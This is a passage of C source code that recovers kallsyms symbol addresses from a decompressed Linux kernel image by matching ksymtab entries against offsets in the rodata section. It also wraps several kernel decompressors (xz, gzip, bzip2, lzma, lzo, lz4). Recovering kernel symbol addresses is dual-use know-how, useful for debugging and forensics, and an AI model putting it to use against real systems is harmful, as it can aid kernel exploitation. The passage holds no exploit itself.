        return FIND_KALLSYMS_TEXT_ERROR;
    else if (shdr_rodata == NULL)
        return FIND_KALLSYMS_RODATA_ERROR;

    kernel_rodata = kernel + shdr_rodata->sh_offset;
    kernel_text = kernel + shdr_text->sh_offset;

    ksymtab = (struct kernel_symbol*) (kernel + shdr_ksymtab->sh_offset);
    ksymtab_lenght = shdr_ksymtab->sh_size / sizeof (struct kernel_symbol);

    const char* first_sym_name = offset_to_ptr(&ksymtab->name_offset);
    const kallsym* current_kallsym = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, first_sym_name);
    for (unsigned long rodata_index = 0; is_not_finded && rodata_index < shdr_rodata->sh_size; ++rodata_index)
    {
        const int32_t* finded_kallsyms_offsets = (const int32_t*) (kernel_rodata + rodata_index);
        for (int ksymtab_index = 0; ksymtab_index < ksymtab_lenght; ++ksymtab_index)
        {
            const char* next_sym_name =     offset_to_ptr(&ksymtab[ksymtab_index + 1].name_offset);
            const uint8_t* symbol_address = offset_to_ptr(&ksymtab[ksymtab_index].value_offset);
            const int32_t symbol_offset =   0xffffffff - (symbol_address - kernel_text);
            const int kallsym_offset =      current_kallsym - kallsyms;
            char type = current_kallsym->type;

            bool is_text = type == TEXT_GLOBAL || type == TEXT_LOCAL;
            if (*finded_kallsyms_offsets != symbol_offset && is_text)
            {
                is_not_finded = true;
                break;
            }
            else if (is_not_finded)
            {
                kernel_kallsyms_offsets = finded_kallsyms_offsets - kallsym_offset;
                is_not_finded = false;
            }

            const kallsym* next_kallsym = find_symbol_from_kallsyms(kallsyms, kallsyms_lenght, next_sym_name);
            finded_kallsyms_offsets = kernel_kallsyms_offsets + (next_kallsym - kallsyms);
            current_kallsym = next_kallsym;
        }
    }

    if (is_not_finded)
        return FIND_KALLSYMS_NOT_FOUND;

    for (int i = 0; i < kallsyms_lenght; ++i)
    {
        if (kallsyms[i].type == ABSOLUTE_ADDRESS)
            kallsyms[i].address = kernel_kallsyms_offsets[i];
        else
            kallsyms[i].address = 0xffffffffffffffff - kernel_kallsyms_offsets[i];
    }

    return FIND_KALLSYMS_SUCCES;
}


void error_decompressor_print(char *x){
    printf("%s \n", x);
}

int unxz(unsigned char *in,
         int in_size,
         int (*fill)(void *dest, unsigned int size),
         int (*flush)(void *src, unsigned int size),
         unsigned char *out, int *in_used,
         void (*error)(char *x));

int unlzo(uint8_t *input, long in_len,
                long (*fill)(void *, unsigned long),
                long (*flush)(void *, unsigned long),
                uint8_t *output, long *posp,
                void (*error) (char *x));

int bunzip2(unsigned char *buf, long len,
            long (*fill)(void*, unsigned long),
            long (*flush)(void*, unsigned long),
            unsigned char *outbuf,
            long *pos,
            void(*error)(char *x));

int unlz4(uint8_t *input, long in_len,
                long (*fill)(void *, unsigned long),
                long (*flush)(void *, unsigned long),
                uint8_t *output, long *posp,
                void (*error) (char *x));

int unlzma(unsigned char *buf, long in_len,
                  long (*fill)(void*, unsigned long),
                  long (*flush)(void*, unsigned long),
                  unsigned char *output,
                  long *posp,
                  void(*error)(char *x));

int gunzip(unsigned char *buf, long len,
               long (*fill)(void*, unsigned long),
               long (*flush)(void*, unsigned long),
               unsigned char *out_buf,
               long *pos,
               void (*error)(char *x));

int decompress_xz(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return unxz((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}

int decompress_gzip(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return gunzip((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}

int decompress_bzip2(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return bunzip2((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}

int decompress_lzma(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return unlzma((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}

int decompress_lzo(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return unlzo((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}

int decompress_lz4(uint8_t* compressed_payload, int compressed_payload_size, uint8_t* payload, unsigned int payload_size)
{
    UNUSED(payload_size);
    return unlz4((unsigned char*)compressed_payload, compressed_payload_size, NULL, NULL, (unsigned char*)payload, NULL, error_decompressor_print);
}
